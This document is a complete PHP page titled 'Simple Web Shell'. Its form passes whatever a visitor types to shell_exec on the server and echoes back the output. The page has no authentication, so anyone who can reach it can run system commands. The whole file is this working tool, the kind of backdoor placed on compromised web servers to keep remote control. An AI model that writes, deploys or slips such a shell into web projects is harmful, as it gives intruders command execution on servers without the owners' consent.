<html>
  <title>
    Simple Web Shell
  </title>
  <body>
    <?php
      $output = ""; // Initialize output variable
      if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['submit_command'])) {
      $command = escapeshellcmd($_POST['command_input']);
      $output = shell_exec($command);
      if ($output === null) {
        $output = "Error: Command failed or produced no output.";
      }
      }
      ?>
    
    <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
      <label for="command_input">Enter Command:</label><br>
      <input type="text" id="command_input" name="command_input" value="<?php echo htmlspecialchars($_POST['command_input'] ?? '', ENT_QUOTES); ?>">
      <input type="submit" name="submit_command" value="Run Command">
    </form>
    <?php if (!empty($output)): ?>
    <h3>System Output:</h3>
    <pre><?php echo htmlspecialchars($output, ENT_QUOTES); ?></pre>
    <?php endif; ?>
  </body>
</html>
